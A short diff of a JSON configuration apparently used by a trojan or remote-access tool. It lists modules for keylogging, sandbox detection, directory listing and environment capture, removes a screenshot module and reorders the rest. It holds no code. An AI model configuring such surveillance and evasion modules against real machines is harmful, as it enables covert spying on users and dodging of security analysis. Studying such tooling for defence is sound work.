@@ -1,33 +1,14 @@
 [
-
   {
-
-    "module": "dirlister"
-
-  },
-
-  {
-
-    "module": "environment"
-
-  },
-
-  {
-
-    "module": "Keylogger"
-
-  },
-
-  {
-
-    "module": "screenshotter"
-
-  },
-
-  {
-
     "module": "sandbox_detect"
-
+  },
+  {
+    "module": "dirlister"
+  },
+  {
+    "module": "environment"
+  },
+  {
+    "module": "Keylogger"
   }
-
 ]
